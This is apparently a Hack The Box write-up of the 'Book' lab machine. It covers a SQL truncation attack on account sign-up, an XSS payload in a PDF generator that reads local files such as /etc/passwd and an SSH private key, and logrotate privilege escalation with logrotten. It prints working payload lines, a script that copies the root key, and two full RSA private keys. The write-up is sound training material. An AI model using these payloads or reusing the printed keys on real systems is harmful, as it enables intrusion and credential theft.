# HTB - Book

## Overview

![](../.gitbook/assets/1-book-infocard.png)

A medium Linux box that was fairly straightforward, but still challenging enough to teach some interesting use cases for 'standard' attacks.

## Useful Skills and Tools

### Burp Repeater

This tool is invaluable for doing any sort of website or web app testing.  From the developers:

> Burp Repeater is a simple tool for manually manipulating and reissuing individual HTTP requests, and analyzing the application's responses. You can send a request to Repeater from anywhere within Burp, modify the request and issue it over and over.

### Using an SSH Private Key for Remote Login

1. First, give your private key file the proper secure permissions `chmod 600 root.id_rsa`
2. Next use `-i <keyfile>` to identify the key to use: `ssh -i id_rsa <user>@10.10.10.176`
3. If prompted, enter the user's key decryption passphrase \(sometimes not set by the user, and separate from the user's Unix password.\)

### Linpeas.sh

This amazing script automates a lot of useful enumeration tasks, and is geared towards helping you find privilege escalation routes.  It won't always find everything you need, but is a good place to start when you gain a new user account on a system.  You can find the newest version of this script [here](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/).

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.176`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.

```text
zweilos@kalimaa:~/htb/book$ nmap -p- -sC -sV -oN book.nmap 10.10.10.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 14:38 EDTNmap scan report for 10.10.10.176
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8272.93 seconds
```

With only two ports open, `22 - SSH` and `80 - HTTP`, there was nothing to do except check to see what was hosted on port 80.

![](../.gitbook/assets/2-login-page.png)

I navigated to `http://10.10.10.176`  which led to a login page. Peaking at the source code of the page revealed an interesting script embedded in the html.

```javascript
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
</script>
```

### SQL Truncate attack

I had to do quite a bit of reading before I found anything that gave me any information on exploiting this.  Essentially the problem boiled down to a timing issue between checking the database for an existing user, and the default configuration for MySQL, which truncates strings that are entered.  So, when a user inputs a username _\(which in this case is the `email` field, based on the login page\)_, the code will compare the inputted string against the list of users to see if it already exists or not.  If not, it will enter it into the database, truncating the string down to the maximum length.  

In this case, the script tells us that the admin has modified this truncation to be 10 characters for `name` and 20 characters for `email`.  After truncating the string, MySQL also removes any trailing whitespace when adding entries, which gives us a perfect attack avenue. More information can be found at: [https://resources.infosecinstitute.com/sql-truncation-attack/\#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

![](../.gitbook/assets/3-register.png)

Unfortunately, I did not currently have any valid usernames to do this attack against, so I created a random user account and logged in.  

![](../.gitbook/assets/3-loggedin.png)

Since I had decided I was looking for a username and/or email address I thought that the most likely place to find those would be on the Contact page. 

![](../.gitbook/assets/screenshot_2020-06-07_10-46-22.png)

My hunch was correct, and I found what I was looking for on the `Contact Us` page.  The email address `admin@book.htb` seemed likely to be the email address for logging into the Admin account.   

![](../.gitbook/assets/6-admin-fail.png)

Before going through contortions to execute some sort of exploit I first tried some basic passwords to log in, but just got this message each time.

![](../.gitbook/assets/7-nope.png)

### Attacking the Sign Up page using SQL Truncate

Next, I tried creating an admin account **without** using the information I had gained from reading about SQL truncation to see what it would do.  

![](../.gitbook/assets/8-admin-create.png)

Trying to \(re\)create the admin account without using SQL truncate results in the following alert message:

![](../.gitbook/assets/9-admin-exists.png)

This was the output I expected.  Next I tried doing the attack by putting a lot of spaces and the word 'test' after the email address so that it was well past the 20 character maximum.  

![](../.gitbook/assets/10-new-admin-deny.png)

Unfortunately, it gave an error:  `A part following '@' should not contain the symbol ' '.`. \(This was in Chromium\).  I tried it again in Firefox, but it also did not seem to work and just gave an unspecified "Please enter an email address" error.  Next, I fired up Burp and captured my POST request to do some troubleshooting.  I sent the request to Repeater so I could easily recreate and modify it as needed.  

![](../.gitbook/assets/10-new-admin-pass.png)

I sent the same exact request using Burp and to my surprise it went through.  I'm guessing that the browsers themselves were doing some form validation in order to prevent attacks of this sort.

```text
POST /index.php HTTP/1.1
Host: 10.10.10.176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.176/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Connection: close
Cookie: PHPSESSID=630fii00brfacrkgee7jom2p4d
Upgrade-Insecure-Requests: 1
DNT: 1

name=admin&email=admin%40book.htb                                    test&password=!AmA$up3r@dmin!!!
```

Thinking that my password choice had perhaps been a bit too weak, I went back and used `!AmA$up3r@dmin!!!` as a password rather than something super-overly-simplistic in order to prevent other users from accidentally stumbling upon the admin account without learning anything about the proper attack. 

![](../.gitbook/assets/11.5-signedin-admin.png)

I then logged in using my shiny new admin password and started looking around.  Nothing seemed to be different in this account other than the username I was logged in as.  

![](../.gitbook/assets/12-submission.png)

I played around with sending different payloads in the collections submission form, but could not find a way to execute any type of code I sent.  This message was the same as when I uploaded files as my basic user account.  Seemingly I had hit a dead end.

## Enumeration with Dirbuster

I decided to check my Dirbuster output to see if there were any useful hidden pages.

```text
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Jun 07 12:08:31 EDT 2020
--------------------------------

http://10.10.10.176:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/admin/

Dirs found with a 403 response:

/images/
/icons/
/docs/
/icons/small/
/admin/export/
/admin/vendor/

--------------------------------
Files found during testing:

Files found with a 302 responce:

/download.php
/contact.php
/search.php
/home.php
/profile.php
/books.php
/feedback.php
/admin/home.php
/admin/feedback.php
/admin/users.php
/admin/messages.php
/logout.php
/collections.php
/settings.php

Files found with a 200 responce:

/index.php
/admin/index.php
/db.php
--------------------------------
```

I was pleasantly surprised to see an `/admin/index.php` page listed. 

![](../.gitbook/assets/14-admin-only.png)

At first I tried to see if the "Forgot your password?" link would do anything, but it wasn't linked to anything and didn't work.  I tried using my new admin credentials I had created and logged in.  

## Initial Foothold

### Road to User

![](../.gitbook/assets/15-real-adminpage.png)

Thankfully, the Administrator panel had some new options.  

![](../.gitbook/assets/screenshot_2020-06-07_12-05-10.png)

Downloading the Collections PDF showed me something interesting.  While l was playing around in the regular account I had done a test upload with the Book Title and Author fields as "a".  

![](../.gitbook/assets/screenshot_2020-07-11_10-13-35.png)

My 'book' was listed in the collection!  You can see that the author and book name is reflecting in the pdf, in what looks like a standard HTML table.  This seems like it could be the code reflection vulnerability I was looking for.  Hopefully there was a way to get it to execute code as well.  _\(The number next to my book seems to be random, and was a link to download exactly whatever I had uploaded with a name of the random number, probably to reduce the possibility of additional code execution vectors.\)_  I also downloaded the Users collection to see if there was anything useful, but just got a good laugh instead.

![](../.gitbook/assets/17-user-brute.png)

You can see the attempts by other users at brute forcing the login page \(looks like burp intruder\), and also at the bottom you can see what appears to be an attempt at SQL injection.  This document had hundreds of lines of similar attacks.  You can see one of my `test` accounts up at the top \(_and that  `peter` guy seems like a very friendly fellow!_\). Sadly no one but me had sent any messages to the admin in the hopes they would get XSS execution on the Feedback page.

### Testing Code Execution with XSS

Since I had seen the name and title I had assigned my book submission in the pdf in what looked like a rendered HTML table format, I wanted to see if it was possible to do cross site scripting through this route.  Luckily for me, there was already a write-up on exactly this scenario at [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html).  First, I tried again sending just the word 'test' in each field to validate what I found.

![](../.gitbook/assets/19-test-submission.png)

I captured this POST in Burp and once again sent it to Repeater.  Sending this resulted in the same pdf collection as before, with a random number next to the the word 'test'.  Next, I changed the Book Title field to contain a simple XSS attack with `<img src=x onerror=document.write('test')>`. 

![](../.gitbook/assets/20-testing.png)

_In case you were wondering, `51091.pdf` is just one of the randomly named files that I had gotten back from downloading the Collections PDF.  The file you upload doesn't seem to have any bearing on this vulnerability_.

![](../.gitbook/assets/20-test.png)

This time only the word 'test' was written to the pdf!  The XSS vulnerability was confirmed.

### Local File Inclusion \(LFI\) through XSS - Cross Site Scripting

The Collections PDF itself contains a dynamically created HTML table. Therefore, any code in fields that the page would normally render prior to being saved as a PDF should get executed.  This can be exploited with JavaScript to do XSS. I decided the next thing I needed to do was to try to get a list of  usernames by downloading`/etc/passwd`.  My next request contained the following JavaScript in the title field:

```text
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

![](../.gitbook/assets/21-pdf-upload.png)

![](../.gitbook/assets/23-etc-passwd.png)

Now I had not only used an XSS vulnerability, but also a LFI vulnerability was also confirmed. From this output I could see that there were only two users who could log in: `reader` and `root`.  

### Finding user creds

Through all of my enumeration I was not able to find any passwords, so I decided to try and see if I could use the LFI vulnerability to determine if `reader` had an SSH key file I could download since port 22 was open.  I modified the example code from the blog post to blindly try to download the most common location and name for a user's SSH key file.  

```text
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

![](../.gitbook/assets/screenshot_2020-07-11_10-14-44.png)

My blind LFI attack was a success! However, copying all of the text from this PDF resulted in output that looked a bit strange, and didn't work for logging in.  Looking at the right edge of the output, I noticed that the text was cut off for some reason.  Hoping it was a rendering issue and not something more difficult to troubleshoot, I opened the file in another program.  

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```

Opening the PDF file in Firefox resulted in the same view, but when I used `ctrl-a`, `ctrl-c` to copy all of the text I was able to copy everything.  For some reason the text was being truncated on the side, and in the default Kali PDF reader it was inaccessible.  Opening it in a browser allowed the HTML embedded in the PDF file to be copied, which in this case included the whole SSH key.  

_Also, as always remember to run `chmod 600 <key_file>` before using SSH keys to log in._

```text
zweilos@kalimaa:~/htb/book$ ssh -i reader.id_rsa reader@10.10.10.176
                    
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  7 17:03:39 UTC 2020

  System load:  0.02               Processes:            265
  Usage of /:   26.5% of 19.56GB   Users logged in:      2
  Memory usage: 40%                IP address for ens33: 10.10.10.176
  Swap usage:   0%

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jun  7 17:00:50 2020 from 10.10.14.147
reader@book:~$
```

### User.txt

First thing to do after logging in...collect my proof!

```text
reader@book:~$ cat user.txt 
51c1d4b5197fa30e3e5d37f8778f95bc
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `reader`

After checking sudo permissions with `sudo -l` \(nothing for this user sadly\) the next thing I do while enumerating Linux machines is try to run [`linpeas.sh`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).  This script automates a lot of the standard enumeration, and also has a nice and easy to read output.  It also has an additional benefit that came in handy for this machine.

```text
[+] Modified interesting files in the last 5mins
/tmp/temp/1.c                                                                                          
/var/log/auth.log
/var/log/lastlog
/var/log/syslog
/var/log/kern.log
/var/log/apache2/error.log
/var/log/apache2/access.log
/var/log/journal/8af6dac9d80548db9b25b66974ae4eb0/system.journal
/var/log/journal/8af6dac9d80548db9b25b66974ae4eb0/user-1000.journal
/var/log/wtmp
/home/reader/.gnupg/trustdb.gpg
/home/reader/.gnupg/pubring.kbx
```

### Logrotate exploitation \(logrotten\)

The `linpeas.sh` script also includes links to a blog with writeups on a lot of different vulnerabilities.  The links are included in relevant sections of the output that shows files that relate to each vulnerability or exploit.  It looked like I might not have to do much searching to find a vulnerability this time, as one of the sections showed a lot of log files along with a link to an interesting privilege escalation route related to `logrotate`.

```text
[+] Writable log files (logrotten)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
Writable: /home/reader/backups/access.log.1                                                            
Writable: /home/reader/backups/access.log
```

The `linpeas.sh` script also told me that there were writable log files in `reader`'s home directory, and that this could potentially by exploited through the `logrotate` service. Checking out the provided link gave me the following helpful information:

> There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location. If logrotate is being executed by root, then the user will be able to write any file in `/etc/bash_completion.d/` that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder, you can privesc \(on most linux distributions, logrotate is executed automatically once a day as user root\). Also, check if apart of `/var/log` there are more files being rotated. More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition). You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).

Reading the `logrotten` documentation, I found that I needed to do a bit more enumeration first to determine if I met all of the prerequisites.  

### Further enumeration as `reader`                                                                                         

```text
drwxr-xr-x 7 reader reader    4096 Jun  7 17:45 .
drwxr-xr-x 3 root   root      4096 Nov 19  2019 ..
drwxr-xr-x 2 reader reader    4096 Jun  7 17:00 backups
lrwxrwxrwx 1 reader reader       9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 reader reader     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 reader reader    3771 Apr  4  2018 .bashrc
drwx------ 2 reader reader    4096 Nov 19  2019 .cache
drwx------ 3 reader reader    4096 Jun  7 17:47 .gnupg
drwxrwxr-x 3 reader reader    4096 Nov 20  2019 .local
-rw-r--r-- 1 reader reader     807 Apr  4  2018 .profile
-rwxrwxr-x 1 reader reader 3078592 Aug 22  2019 pspy64
drwx------ 2 reader reader    4096 Nov 28  2019 .ssh
-r-------- 1 reader reader      33 Nov 29  2019 user.txt
-rw------- 1 reader reader    1639 Jun  7 17:45 .viminfo
```

The `backups/` folder in `/home/reader` contained two log files, which were writable by `reader`. 

While using [pspy](https://github.com/DominicBreuker/pspy) to monitor running processes I found this interesting line: `2020/06/07 17:08:01 CMD: UID=0 PID=16535 | mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';`It looked to me like a script \(probably in a cron job\) that was resetting the password of the admin account I had used to get in.  I tried this password on the root account hoping it would let me in, but no dice.

```text
# see "man logrotate" for details
# rotate log files weekly
weekly

# use the syslog group by default, since this is the owning group
# of /var/log/syslog.
su root syslog

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

```

Inside `/etc/logrotate.conf` I found that the "create" option had been set.  There was only one condition remaining to meet the requirements for this exploit: I had to know that `logrotate` was actually running \(as root\). 

After running pspy for awhile, this entry showed up: `2020/06/07 17:08:30 CMD: UID=0 PID=16773 | /usr/sbin/logrotate -f /root/log.cfg.` So the system was indeed running `logrotate`, and it was loading a configuration file from the `/root directory`.  This seemed like enough evidence the process was running as root to me to test it.  It was now time to test out this exploit to see if I could escalate privileges to root.

### Getting a root shell

From the exploit writer at [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten):

> #### Precondition for privilege escalation
>
> * [x] Logrotate has to be executed as root
> * [x] The logpath needs to be in control of the attacker
> * [x] Any option that creates files is set in the logrotate configuration
>
> #### To run the exploit:
>
> If "create"-option is set in logrotate.cfg:
>
> ```text
> ./logrotten -p ./payloadfile /tmp/log/pwnme.log
> ```
>
> If "compress"-option is set in logrotate.cfg:
>
> ```text
> ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
> ```

Based on my enumeration I found that all of the conditions for vulnerability to this exploit were met for the "create" option, except for one thing that wasn't in the checklist.  I could not find any configuration files related to `logrotate` that mentioned `access.log` in the `/home/reader/backups` folder. Since this was my writeable log file, it was pretty important that it be rotated by the service.  I decided to go ahead and try it anyway since it still looked like a likely approach.  I created a payload that would hopefully get me root access, and ran the exploit.

```text
#!/bin/bash
/bin/cat /root/root.txt > /dev/shm/test
/bin/cat /root/.ssh/id_rsa > /dev/shm/test2
```

My payload was designed to exfiltrate both `root.txt` and `root`'s SSH key.

```text
reader@book:/dev/shm$ ./logrotten -p ./payload /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

However, just running the exploit was not enough.  In order to execute my script, I had to force log rotation by writing to the log a valid entry.  I simply copied the valid entry from the backup in the same folder:

```text
reader@book:~/backups$ cat access.log.1
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
reader@book:~/backups$ cp access.log.1 access.log
```

### Root.txt

It was time to collect my loot and see if I got the output I expected.

```text
reader@book:/dev/shm$ cat test 
84da92adf998a1c7231297f70dd89714
```

The first file indeed contained the root flag!

```text
reader@book:/dev/shm$ cat test2
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCETrWcIdNU6J
cFzQxCMM/E8UwLdD0fzUJtDgo4SUuwUmkPc6FXuLrZ+xqJaKoeu7/3WgjNBnRc7E
z6kgpwnf4GOqpvxx1R1W+atbMkkWn6Ne89ogCUarJFVMEszzuC+14Id83wWSc8uV
ZfwOR1y/Xqdu82HwoAMD3QG/gu6jER8V7zsC0ByAyTLT7VujBAP9USfqOeqza2UN
GWUqIckZ2ITbChBuTeahfH2Oni7Z3q2wXzn/0yubA8BpyzVut4Xy6ZgjpH6tlwQG
BEbULdw9d/E0ZFHN4MoNWuKtybx4iVMTBcZcyQIDAQABAoIBAQCgBcxwIEb2qSp7
KQP2J0ZAPfFWmzzQum26b75eLA3HzasBJOGhlhwlElgY2qNlKJkc9nOrFrePAfdN
PeXeYjXwWclL4MIAKjlFQPVg4v0Gs3GCKqMoEymMdUMlHoer2SPv0N4UBuldfXYM
PhCpebtj7lMdDGUC60Ha0C4FpaiJLdbpfxHase/uHvp3S/x1oMyLwMOOSOoRZZ2B
Ap+fnQEvGmp7QwfH+cJT8ggncyN+Gc17NwXrqvWhkIGnf7Bh+stJeE/sKsvG83Bi
E5ugJKIIipGpZ6ubhmZZ/Wndl8Qcf80EbUYs4oIICWCMu2401dvPMXRp7PCQmAJB
5FVQhEadAoGBAOQ2/nTQCOb2DaiFXCsZSr7NTJCSD2d3s1L6cZc95LThXLL6sWJq
mljR6pC7g17HTTfoXXM2JN9+kz5zNms/eVvO1Ot9GPYWj6TmgWnJlWpT075U3CMU
MNEzJtWyrUGbbRvm/2C8pvNSbLhmtdAg3pDsFb884OT8b4arufE7bdWHAoGBAMjo
y0+3awaLj7ILGgvukDfpK4sMvYmx4QYK2L1R6pkGX2dxa4fs/uFx45Qk79AGc55R
IV1OjFqDoq/s4jj1sChKF2+8+JUcrJMsk0WIMHNtDprI5ibYy7XfHe7oHnOUxCTS
CPrfj2jYM/VCkLTQzdOeITDDIUGG4QGUML8IbM8vAoGBAM6apuSTzetiCF1vVlDC
VfPEorMjOATgzhyqFJnqc5n5iFWUNXC2t8L/T47142mznsmleKyr8NfQnHbmEPcp
ALJH3mTO3QE0zZhpAfIGiFk5SLG/24d6aPOLjnXai5Wgozemeb5XLAGOtlR+z8x7
ZWLoCIwYDjXf/wt5fh3RQo8TAoGAJ9Da2gWDlFx8MdC5bLvuoOX41ynDNlKmQchM
g9iEIad9qMZ1hQ6WxJ8JdwaK8DMXHrz9W7yBXD7SMwNDIf6u1o04b9CHgyWXneMr
nJAM6hMm3c4KrpAwbu60w/AEeOt2o8VsOiusBB80zNpQS0VGRTYFZeCF6rKMTP/N
WU6WIckCgYBE3k00nlMiBNPBn9ZC6legIgRTb/M+WuG7DVxiRltwMoDMVIoi1oXT
ExVWHvmPJh6qYvA8WfvdPYhunyIstqHEPGn14fSl6xx3+eR3djjO6J7VFgypcQwB
yiu6RurPM+vUkQKb1omS+VqPH+Q7FiO+qeywqxSBotnLvVAiaOywUQ==
-----END RSA PRIVATE KEY-----
```

And file number two also contained the root SSH key.  The exploit had worked without too much fuss, except for figuring out how to make `logrotate` run.  I wasn't entirely certain of the interval that was set for `access.log` to be backed up since I didn't ever see it's configuration file. 

And, as always, remember to `chmod 600` your private SSH key files before use! _\(Yes I say this a lot. It's also easy to forget for some reason...\)_

```text
zweilos@kalimaa:~/htb/book$ chmod 600 root.id_rsa 
zweilos@kalimaa:~/htb/book$ ssh -i root.id_rsa root@10.10.10.176
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Feb 19 14:49:02 2020 from ::1
root@book:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
book
root@book:~#
```

## Solving the logrotate mystery

After gaining root access I found out why I was unable to discover what was causing the logs in `/home/reader/backups` to be rotated.  In the `/root` directory there were some files for cleaning up the system of other user's artifacts, and also the script and config that rotated `access.log` in the `backup/` folder.  

```text
root@book:~# cat log.sh
#!/bin/sh
/usr/sbin/logrotate -f /root/log.cfg

root@book:~# cat log.cfg 
/home/reader/backups/access.log {
        daily
        rotate 12
        missingok
        notifempty
        size 1k
        create
}
```

Mystery solved!

Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) for creating a machine that had some new and interesting routes to gain privileges.  I definitely liked how there were few to no rabbit holes to lose myself in!

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).

